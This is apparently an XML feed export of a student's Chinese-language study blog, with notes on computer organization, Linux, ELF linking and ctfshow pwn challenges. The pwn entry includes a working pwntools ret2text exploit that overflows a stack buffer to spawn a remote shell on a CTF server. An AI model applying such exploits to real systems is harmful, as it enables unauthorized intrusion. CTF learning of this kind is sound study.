<li>复习提纲到pdf第41页</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Linux notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【saveMyLinux】Linux课程要点复习</title>
    <url>/2024/07/12/CS_Notes/Linux/%E3%80%90saveMyLinux%E3%80%91Linux%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>翘佳人的Linux缓考复习伊始</li>
</ul>
<h3 id="复习提纲-pdf"><a class="header-anchor" href="#复习提纲-pdf">¶</a>复习提纲.pdf</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="Linux内核设计与实现-实验指导书-pdf"><a class="header-anchor" href="#Linux内核设计与实现-实验指导书-pdf">¶</a>Linux内核设计与实现-实验指导书.pdf</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/bd0XHIykIpmPZE?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<!-- <iframe src="https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1" --></div></div>]]></content>
      <categories>
        <category>notes</category>
        <category>Linux notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【计组】前言+第一章 计算机系统概论</title>
    <url>/2024/08/29/CS_Notes/computer%20organization/%E3%80%90%E8%AE%A1%E7%BB%84%E3%80%91%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>计算机组成原理的笔记</li>
<li>应该是需要很多图</li>
</ul>
<h3 id="前言-计组学什么"><a class="header-anchor" href="#前言-计组学什么">¶</a>前言 / 计组学什么</h3>
<ul>
<li>重点讲授：单处理器系统的组成和工作原理
<ul>
<li>在此基础上：并行体系结构</li>
</ul>
</li>
<li>理解构成计算机硬件的基本电路的特性和设计方法</li>
<li>了解计算机系统整体概念</li>
<li>理解指令在计算机硬件上的执行过程</li>
<li>理解计算机系统的层次结构</li>
<li>理解高级语言程序、指令系统体系结构、编译器、操作系统和硬件部件之间的关系</li>
</ul>
<h1>第一章 计算机系统概论</h1>
<h2 id="计算机的分类"><a class="header-anchor" href="#计算机的分类">¶</a>计算机的分类</h2>
<ul>
<li>电子模拟计算机</li>
<li>电子数字计算机 / 电脑 / 电子计算机
<ul>
<li>专用计算机</li>
<li>通用计算机
<ul>
<li>超级计算机</li>
<li>大型机</li>
<li>服务器</li>
<li>PC机</li>
<li>单片机</li>
<li>多核机</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="完整的计算机系统"><a class="header-anchor" href="#完整的计算机系统">¶</a>完整的计算机系统</h2>
<ul>
<li><strong>硬件</strong>：组成计算机的各种设备实体
<ul>
<li><strong>硬件系统</strong>：组成一台计算机的各种物理装置，由各种实实在在的器件组成的，是计算机进行工作的物质基础</li>
</ul>
</li>
<li><strong>软件</strong>：泛指各种程序和文件</li>
</ul>
<h2 id="计算机系统的硬件组成"><a class="header-anchor" href="#计算机系统的硬件组成">¶</a>计算机系统的硬件组成</h2>
<ul>
<li>
<p>五大功能部件：</p>
<ul>
<li><strong><u>运算器</u></strong>、<strong><u>控制器</u></strong>、<strong><u>存储器</u></strong>（<u>高速缓存  主存储器  虚拟存储器</u>）、<strong><u>输入设备</u></strong>、<strong><u>输出设备</u></strong>
<ul>
<li>运算器→算盘</li>
<li>存储器→“记忆”功能的部件</li>
<li>输入输出设备</li>
<li>控制器→自动控制整个计算过程</li>
</ul>
</li>
<li>另一种分法：CPU、存储器、输入设备、输出设备、总线</li>
</ul>
</li>
<li>
<p>设备和部件通过 <strong><u>总线</u></strong> 和 **<u>接口</u>**连结在一起，构成完整的计算机系统</p>
</li>
<li>
<p>此处缺图  ppt合集11页   15页</p>
</li>
</ul>
<h3 id="运算器"><a class="header-anchor" href="#运算器">¶</a>运算器</h3>
<ul>
<li>计算机中进行数据加工的部件</li>
<li>主要功能：
<ul>
<li>执行数值数据的加减乘除等<em>算术运算</em>和逻辑数据的与或非等<em>逻辑运算</em>，由一个被称为 ALU 的线路完成</li>
<li>暂时存放参加运算的数据和中间结果，由多个通用寄存器和乘商寄存器承担</li>
<li>通常也是数据传输的通路</li>
</ul>
</li>
<li>运算中，数的位数越多，计算的精度越高，但所需电子器件也越多</li>
<li>运算器长度一般是：8位、16位、32位或64位</li>
</ul>
<h3 id="控制器"><a class="header-anchor" href="#控制器">¶</a>控制器</h3>
<ul>
<li>
<p>计算机中控制执行指令的部件，向计算机各功能部件提供每一时刻协同运行所需要的控制信号</p>
<ul>
<li>
<p>正确分析与执行每条指令：</p>
<blockquote>
<p>取指令－&gt;分析指令－&gt;执行指令</p>
</blockquote>
</li>
<li>
<p>保证指令按规定序列自动连续地执行</p>
</li>
<li>
<p>对各种异常情况和请求及时响应和处理</p>
</li>
</ul>
</li>
<li>
<p><u>基本任务</u>：按照程序所排的指令序列，从存储器取出一条指令放到控制器中，对该指令的操作码由译码器进行分析判别，然后根据指令性质，执行这条指令，进行相应的操作</p>
<ul>
<li><strong>取指周期</strong>：取指令的时间</li>
<li><strong>执行周期</strong>：执行指令的时间</li>
<li>控制器反复交替地处在取指周期与执行周期之中。每取出一条指令，控制器中的指令计数器就加1，从而为取下一条指令做好准备</li>
<li><strong>存储程序</strong>：将指令存放到存储器的程序</li>
</ul>
</li>
</ul>
<h3 id="存储器"><a class="header-anchor" href="#存储器">¶</a>存储器</h3>
<ul>
<li>
<p>由<em>高速缓冲存储器、主存储器、虚拟存储器</em>所组成的<em>多级存储器系统</em>，是计算机中用于存储程序和数据的部件</p>
</li>
<li>
<p>功能：</p>
<ul>
<li>保存或“记忆”解题的<strong>原始数据</strong>和<strong>解题步骤</strong>。在运算前把参加运算的数据和解体步骤通过输入输出设备送到存储器中保存起来</li>
<li>存储器存储的全是0 / 1的二进制代码</li>
<li>目前采用半导体器件来作为存储器</li>
<li>一个半导体触发器（D触发器等）可以记忆一位二进制代码，16位二进制代码就需要16个触发器来保存</li>
</ul>
</li>
<li>
<p>存储器的任何位置既可以存数据也可以存指令，但是一般将指令和数据分开存</p>
</li>
<li>
<p><strong>程序控制</strong>：控制器依靠存储的的程序来控制全机协调地完成计算任务</p>
</li>
<li>
<p><strong><u>存储程序并按地址执行</u><strong>就是</strong>冯·诺依曼型计算机</strong>的设计思想</p>
</li>
<li>
<p>相关概念</p>
<ul>
<li><strong>存储元</strong>：保存一位二进制的触发器，称为一个存储元</li>
<li><strong>存储单元</strong>：保存一个字的所有存储元，称为一个存储单元</li>
<li><strong>地址</strong>：每个存储单元的编号</li>
<li><strong>存储容量</strong>：存储器所有存储单元的总数。通常用单位“KB、MB、GB、TB、PB”  表示</li>
<li><strong>外存储器</strong>：存储容量更大的磁盘存储器、光盘存储器等
<ul>
<li><strong>内存储器</strong>：如半导体存储器</li>
</ul>
</li>
<li><u>关系</u>：由若干个<u>存储元</u>组成一个<u>存储单元</u>（8个bit,即一个字节），然后再由许多存储单元组成一个<u>存储器</u></li>
</ul>
</li>
</ul>
<h3 id="输入设备"><a class="header-anchor" href="#输入设备">¶</a>输入设备</h3>
<ul>
<li>向计算机中送入程序和数据的具有一定独立功能的设备
<ul>
<li>通过 接口 和 总线与计算机主机连通，用于人机交互联系</li>
<li>如：计算机键盘和鼠标等</li>
</ul>
</li>
<li><strong>作用</strong>：把人们所熟悉的信息形式变换为机器内部所能接收和识别的二进制信息形式</li>
</ul>
<h3 id="输出设备"><a class="header-anchor" href="#输出设备">¶</a>输出设备</h3>
<ul>
<li>
<p>计算机中用于送出计算机内部信息的设备</p>
<ul>
<li>如：打印机、显示器等</li>
</ul>
</li>
<li>
<p><strong>作用</strong>：把计算机处理的结果变换为人或其他机器所能接收和识别的信息形式</p>
</li>
<li>
<p>计算机的输入/输出设备通常称为<strong>外围设备</strong>（简称<strong>外设</strong>）</p>
<ul>
<li>外设通过<strong>适配器</strong>部件与主机相连接</li>
</ul>
</li>
</ul>
<h2 id="冯·诺依曼思想"><a class="header-anchor" href="#冯·诺依曼思想">¶</a>冯·诺依曼思想</h2>
<ul>
<li>
<p><u><strong>（1）采用二进制形式表示数据和指令</strong></u></p>
<ul>
<li><strong>指令</strong>是程序的基本单位，<strong>程序</strong>是若干指令的有序集合</li>
<li>指令与数据均以二进制代码的形式同存于<strong>存储器</strong>中</li>
</ul>
</li>
<li>
<p><strong><u>（2）由输入设备、输出设备、运算器、存储器和控制器五大部件组成</u></strong></p>
<ul>
<li>运算器和控制器统称为 <strong>CPU</strong></li>
<li>把CPU与主存储器(内存)统称为<strong>主机</strong></li>
<li>输入设备、输出设备、外存储器称为<strong>外部设备</strong>，简称为<strong>I/O设备</strong></li>
</ul>
</li>
<li>
<p><strong><u>（3）采用存储程序方式</u></strong></p>
<ul>
<li>指在用计算机解题之前，事先编制好程序，并连同所需的数据预先存入主存储器中</li>
<li>在解题过程(运行程序)中，由控制器按照事先编好并存入存储器中的程序自动地、连续地从存储器中依次取出指令并执行，直到获得所要求的结果为止</li>
</ul>
</li>
<li>
<p><u><strong>存储程序方式是诺依曼思想的核心，是计算机能高速自动运行的基础</strong></u></p>
</li>
<li>
<p><strong><u>（4）指令和数据以同等地位存于存储器， 可按地址寻访，程序和数据统一存储</u></strong></p>
</li>
<li>
<p><strong><u>（5）指令由操作码和地址码组成</u></strong></p>
</li>
<li>
<p><strong><u>（6）以运算器为中心</u></strong></p>
</li>
</ul>
<h2 id="计算机的基本功能"><a class="header-anchor" href="#计算机的基本功能">¶</a>计算机的基本功能</h2>
<ul>
<li>包括**<u>数据加工</u><strong>、</strong><u>数据保存</u><strong>、</strong><u>数据传送</u><strong>和</strong><u>操作控制</u>**等</li>
</ul>
<h2 id="计算机的性能指标"><a class="header-anchor" href="#计算机的性能指标">¶</a>计算机的性能指标</h2>
<ul>
<li><strong>机器字长</strong>
<ul>
<li>指处理机运算器中<strong>一次</strong>能够完成二进制数运算的位数。当前处理机的字长有8位、16位、32位、64位</li>
<li>字长越长，表示计算的精度越高</li>
<li>与 CPU 中的寄存器位数有关</li>
</ul>
</li>
<li><strong>吞吐量</strong>
<ul>
<li>表征一台计算机在<strong>某一时间间隔</strong>内能够处理的信息量</li>
<li>单位是字节/秒（B/S）</li>
</ul>
</li>
<li><strong>响应时间</strong>
<ul>
<li>表征从输入有效到系统产生响应之间的时间度量</li>
<li>用时间单位来度量，例如微秒（10-6S）、纳秒（10-9S）</li>
</ul>
</li>
<li><strong>利用率</strong>
<ul>
<li>表示在给定的时间间隔内，系统被实际使用的时间所占的比率</li>
<li>一般用百分比表示</li>
</ul>
</li>
<li><strong>总线宽度</strong>
<ul>
<li>一般指CPU中运算器与存储器之间进行互连的内部总线二进制位数</li>
</ul>
</li>
<li><strong>存储器容量</strong>
<ul>
<li>存储器中所有存储单元的总数目</li>
<li>通常用KB、MB、GB、TB来表示</li>
<li>其中K=2^10， M=2 ^ 20，G=2 ^ 30，T=2 ^ 40，B=8位（1个字节）</li>
<li>存储器容量越大，记忆的二进制数越多</li>
</ul>
</li>
<li><strong>存储器带宽</strong>
<ul>
<li>存储器的速度指标，单位时间内从存储器读出的二进制数信息量</li>
<li>一般用字节数/秒表示</li>
</ul>
</li>
<li>*<em><u>主频 / 时钟周期 <em></em></u></em>
<ul>
<li>CPU的工作节拍受主时钟控制，主时钟不断产生固定频率的时钟，主时钟的频率（f）叫CPU的主频</li>
<li>度量单位是MHz（兆赫兹）、GHz（吉赫兹）</li>
<li>主频的倒数称为CPU时钟周期（T），即T=1/f</li>
<li>度量单位是微秒、纳秒</li>
</ul>
</li>
<li><strong>CPU执行时间</strong>
<ul>
<li>表示CPU执行一段程序所占用的CPU时间</li>
<li><code> CPU执行时间 ＝ CPU时钟周期数 × CPU时钟周期长</code></li>
</ul>
</li>
<li>*<em><u>CPI <em></em></u></em>
<ul>
<li>表示每条指令周期数Cycles Per Instruction ，即执行一条指令所需的平均时钟周期数</li>
<li><code>CPI  = 执行某段程序所需的CPU时钟周期数 / 该程序包含的指令条数</code></li>
</ul>
</li>
<li>*<em><u>MIPS <em></em></u></em>
<ul>
<li>表示每秒百万条指令数</li>
<li><code>MIPS = (指令条数) / (程序执行时间 × 10 ^ 6)</code></li>
</ul>
</li>
<li><strong>MFLOPS</strong>
<ul>
<li>表示每秒百万次浮点操作次数</li>
<li><code>MFLOPS = (程序中的浮点操作次数) / (程序执行时间 × 10 ^ 6)  </code></li>
</ul>
</li>
<li><strong>TFLOPS</strong>
<ul>
<li>表示每秒万亿次浮点操作次数</li>
<li>该技术指标一般在超级计算机中使用</li>
</ul>
</li>
</ul>
<h2 id="章末习题"><a class="header-anchor" href="#章末习题">¶</a>章末习题</h2>
<ul>
<li>ppt 合集 第46页
<ul>
<li>假定基准程序A在某计算机的运行时间为100秒，其中90 秒为CPU时间，其余时间为I/O时间，若CPU速度提高50%，I/O速度不变，则运行基准程序A所消耗的时间为（ 70s ）
<ul>
<li>其实这题不懂……</li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>
<h1>第二章 运算方法和运算器</h1>
<h1>第三章 存储系统</h1>
<h1>第四章 指令系统</h1>
<h1>第五章 中央处理器</h1>
<h1>第六章 总线系统</h1>
<h1>第七章 外围设备</h1>
<h1>第八章 输入/输出系统</h1>
<h1>第九章 并行组织与结构</h1>
]]></content>
      <categories>
        <category>notes</category>
        <category>computer organization</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>computer organization</tag>
      </tags>
  </entry>
  <entry>
    <title>【蓝鲸】环境部署过程知识点记录</title>
    <url>/2024/08/31/CS_Notes/%E8%93%9D%E9%B2%B8/%E3%80%90%E8%93%9D%E9%B2%B8%E3%80%91%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E8%BF%87%E7%A8%8B%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="资料收集"><a class="header-anchor" href="#资料收集">¶</a>资料收集</h3>
<ul>
<li><a href="https://docs.djangoproject.com/zh-hans/2.2/">Django 文档 | Django 文档 | Django (djangoproject.com)</a></li>
<li><a href="https://www.bookstack.cn/read/bk-sops-3.4.13/docs-install-dev_deploy.md#%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93">快速开始 - 开发环境后台部署 - 《腾讯蓝鲸智云标准运维(SOPS) v3.4.13 使用手册》 - 书栈网 · BookStack</a></li>
<li><a href="https://hunyuan.tencent.com/">腾讯混元 (tencent.com)</a>   芝士腾讯的大模型</li>
<li><a href="https://github.com/Tencent/HunyuanDiT">Tencent/HunyuanDiT: Hunyuan-DiT : A Powerful Multi-Resolution Diffusion Transformer with Fine-Grained Chinese Understanding (github.com)</a>   腾讯混元DiT【看不懂的：高性能细粒度中文理解多分辨率扩散Transformer模型】腾讯的图生文模型</li>
</ul>
<h3 id="pip相关操作"><a class="header-anchor" href="#pip相关操作">¶</a>pip相关操作</h3>
<ul>
<li><code>pip list</code> / <code>pip freeze</code>  查看已安装的包列表</li>
<li><code>pip install xxx</code>   安装xxx</li>
</ul>
<h3 id="cmd（管理员模式）"><a class="header-anchor" href="#cmd（管理员模式）">¶</a>cmd（管理员模式）</h3>
<ul>
<li>pip
<ul>
<li>安装时候需要关梯子</li>
</ul>
</li>
<li>转换到某一路径
<ul>
<li><code>cd /d xxx路径</code></li>
</ul>
</li>
</ul>
<h3 id="git-bash无法push项目到远程仓库"><a class="header-anchor" href="#git-bash无法push项目到远程仓库">¶</a>git bash无法push项目到远程仓库</h3>
<ul>
<li>首先强制使用：<code>git push -u origin +master</code></li>
<li>同步远程仓库文件到本地,之后再提交：<code>git pull</code></li>
<li>再一次push到远程仓库：<code>git push origin master</code></li>
</ul>
<h3 id="秘塔AI搜索"><a class="header-anchor" href="#秘塔AI搜索">¶</a>秘塔AI搜索</h3>
<ul>
<li>
<p>链接：<a href="https://metaso.cn/about-us">秘塔AI搜索 (metaso.cn)</a></p>
</li>
<li>
<p>还有一个AI搜索工具：<a href="https://www.tiangong.cn/?channel=bing_pz">天工AI-搜索、对话、写作、文档分析、画画、做PPT的全能AI助手 (tiangong.cn)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Blue Whale notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>蓝鲸</tag>
      </tags>
  </entry>
  <entry>
    <title>【Pvvn】ELF文件基础</title>
    <url>/2024/08/24/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91ELF%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="第一个标题"><a class="header-anchor" href="#第一个标题">¶</a>第一个标题</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim hello.c</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_int_84;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c hello.c -m32  # 生成32位程序</span><br><span class="line"># ls</span><br><span class="line"># hello.c  hello.o</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看基本信息</span><br><span class="line"># 显示名为 hello.o 的目标文件的头部信息（header）</span><br><span class="line">objdump -h hello.o</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 用来显示名为 hello.o 的目标文件的ELF头部信息</span><br><span class="line">readelf -h hello.o</span><br></pre></td></tr></table></figure>
<ul>
<li>010editor的使用</li>
</ul>
<h3 id="链接（LINKING"><a class="header-anchor" href="#链接（LINKING">¶</a>链接（LINKING)</h3>
<ul>
<li>链接是将一些指令对其他符号地址的引用加以修正</li>
<li>链接过程包括了
<ul>
<li><strong>地址和空间分配</strong>（Address and Storage Allocation)</li>
<li><strong>符号决议</strong> (Symbol Resolution) <strong>符号绑定</strong> (Symbol Binding) <strong>名称绑定</strong>(Name Binding)</li>
<li><strong>重定位</strong> (Relocation)</li>
</ul>
</li>
</ul>
<h4 id="静态链接"><a class="header-anchor" href="#静态链接">¶</a>静态链接</h4>
<ul>
<li>将多个目标文件链接在一起并生成可执行文件的过程</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.c</span></span><br><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a. <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    *a ^= *b ^= *a ^= *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c a.c b.c -fno-stack-protector -m32</span><br><span class="line"># 执行完获得a.o和b.o两个文件</span><br></pre></td></tr></table></figure>
<ul>
<li>一个目标文件引用了另一个目标文件，就需要使用静态链接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x ./a.o    # 给名为 a.o 的文件添加执行权限</span><br></pre></td></tr></table></figure>
<ul>
<li>使用ld -m elf_i386 a.o b.o -e main -o ab命令进行链接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ld -m elf_i386 a.o b.o -e main -o ab   # 使用 GNU linker (ld) 将两个目标文件 a.o 和 b.o 链接成一个可执行文件 ab</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【Pvvn】037-072知识点记录</title>
    <url>/2024/07/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91037-072%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p>跟着做的同时自己记录一下</p>
</li>
<li>
<p>vvp的链接：<a href="https://brocademaple.github.io/2024/07/16/CS_Notes/PWN/%5BPwn%5Dwp%E5%AD%98%E6%A1%A3/">【Puun】uup留档 | BROCADEMAPLE</a></p>
</li>
</ul>
<h3 id="036-5"><a class="header-anchor" href="#036-5">¶</a>036.5</h3>
<h3 id="037-栈溢出-后门函数（32位）"><a class="header-anchor" href="#037-栈溢出-后门函数（32位）">¶</a>037 栈溢出+后门函数（32位）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn037/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位 关闭了栈保护与PIE </span><br><span class="line">→可以直接修改栈上的返回地址来攻击</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just very easy ret2text&amp;&amp;32bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  	[esp+6h]：这表示buf数组的起始地址相对于ESP（栈指针）的偏移量</span></span><br><span class="line"><span class="comment">  	ESP通常指向栈顶，在函数调用时，ESP会在每次压栈操作后向下移动</span></span><br><span class="line"><span class="comment">  	[ebp-12h]：这表示buf数组的起始地址相对于EBP（基址指针）的偏移量</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首先声明一个名为buf的字符数组，大小为14字节，距离ebp的距离为0x12</span></span><br><span class="line"><span class="comment">	通过read函数能够读入0x32（十六进制），转为十进制就是50个字节的数据</span></span><br><span class="line"><span class="comment">	▷存在栈溢出</span></span><br><span class="line"><span class="comment">	→当读入的数据超过buf的大小时，可以覆盖后续的栈帧数据，包括返回地址*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 利用栈移除，可以通过构造payload覆盖返回地址，使其指向backdoor函数的地址 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>直接进行溢出，覆盖返回地址，再输入后门函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)  测试本地pwn</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28216</span>)  <span class="comment"># 连接远程服务，参数为服务的主机名和端口号</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)  <span class="comment"># 创建了一个ELF对象，它用于分析和操作名为pwn的二进制文件。ELF对象提供了多种方法来访问二进制文件的内部结构，如符号表、节头表、段头表等。在这个场景下，我们需要找到backdoor函数的地址，所以ELF对象是必不可少的</span></span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]  <span class="comment"># 通过ELF对象的sym属性获取了backdoor函数在内存中的地址。elf.sym实际上是一个字典，其中键是符号的名字，值是该符号在二进制文件中的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x12</span> + <span class="number">4</span>) + p32(backdoor)  <span class="comment"># 其中&#x27;A&#x27; * (0x12 + 4)是填充部分，用来覆盖函数调用后的返回地址；p32(backdoor)将backdoor函数的地址转换为32位的小端格式，以便正确地放置在payload中  </span></span><br><span class="line"><span class="comment"># 这个地方没太懂</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()  <span class="comment"># 接收服务器的响应</span></span><br><span class="line"></span><br><span class="line">io.interactive()  <span class="comment"># 进入交互模式，允许手动操作shell</span></span><br></pre></td></tr></table></figure>
<ul>
<li>获得shell</li>
<li><code>cat /ctfshow_flag</code></li>
<li>ctfshow{b699b9f5-e8cd-41d1-b925-8ce4121dd3c6}</li>
</ul>
<h3 id="038-栈溢出-后门函数（64位）"><a class="header-anchor" href="#038-栈溢出-后门函数（64位）">¶</a>038 栈溢出+后门函数（64位）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn038/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位  关闭栈保护和PIE</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400890);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_4009A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400A30);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400AB8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400B50);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span 